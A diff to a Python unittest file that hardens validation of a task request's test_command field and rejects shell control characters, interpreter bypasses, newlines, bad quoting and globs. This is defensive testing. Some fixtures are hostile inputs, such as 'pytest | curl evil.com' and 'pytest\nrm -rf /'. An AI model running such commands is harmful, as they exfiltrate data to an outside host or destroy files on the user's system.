@@ -3,7 +3,7 @@
 Tests the security boundary:
   - repo_url restricted to known HTTPS git hosts
   - requirements minimum length and max length
-  - test_command blocks dangerous shell constructs
+  - test_command is a shell-free argv command using a known test runner
   - max_iterations bounded (1-500)
 """
 import unittest
@@ -113,6 +113,16 @@ class TestTestCommandValidation(unittest.TestCase):
         )
         self.assertEqual(req.test_command, "npm test")
 
+    def test_valid_python_module(self):
+        req = CreateTaskRequest(
+            repo_url="https://github.com/user/repo.git",
+            requirements="Build a REST API for user management",
+            test_command="python3 -m pytest tests/test_api.py::test_create",
+        )
+        self.assertEqual(
+            req.test_command, "python3 -m pytest tests/test_api.py::test_create"
+        )
+
     def test_reject_pipe(self):
         with self.assertRaises(ValidationError) as ctx:
             CreateTaskRequest(
@@ -120,7 +130,7 @@ class TestTestCommandValidation(unittest.TestCase):
                 requirements="Build a REST API for user management",
                 test_command="pytest | curl evil.com",
             )
-        self.assertIn("disallowed", str(ctx.exception))
+        self.assertIn("shell control", str(ctx.exception))
 
     def test_reject_semicolon(self):
         with self.assertRaises(ValidationError):
@@ -160,6 +170,49 @@ class TestTestCommandValidation(unittest.TestCase):
                 repo_url="https://github.com/user/repo.git",
                 requirements="Build a REST API for user management",
                 test_command="pytest > /dev/null",
+            )
+
+    def test_reject_shell_interpreter_bypass(self):
+        with self.assertRaises(ValidationError) as ctx:
+            CreateTaskRequest(
+                repo_url="https://github.com/user/repo.git",
+                requirements="Build a REST API for user management",
+                test_command="bash -c pytest",
+            )
+        self.assertIn("runner is not allowed", str(ctx.exception))
+
+    def test_reject_inline_python_bypass(self):
+        with self.assertRaises(ValidationError) as ctx:
+            CreateTaskRequest(
+                repo_url="https://github.com/user/repo.git",
+                requirements="Build a REST API for user management",
+                test_command="python3 -c pass",
+            )
+        self.assertIn("inline Python", str(ctx.exception))
+
+    def test_reject_newline_chain(self):
+        with self.assertRaises(ValidationError):
+            CreateTaskRequest(
+                repo_url="https://github.com/user/repo.git",
+                requirements="Build a REST API for user management",
+                test_command="pytest\nrm -rf /",
+            )
+
+    def test_reject_malformed_quoting(self):
+        with self.assertRaises(ValidationError) as ctx:
+            CreateTaskRequest(
+                repo_url="https://github.com/user/repo.git",
+                requirements="Build a REST API for user management",
+                test_command="pytest 'unterminated",
+            )
+        self.assertIn("argv syntax", str(ctx.exception))
+
+    def test_reject_glob_expansion(self):
+        with self.assertRaises(ValidationError):
+            CreateTaskRequest(
+                repo_url="https://github.com/user/repo.git",
+                requirements="Build a REST API for user management",
+                test_command="pytest tests/*.py",
             )
 
 
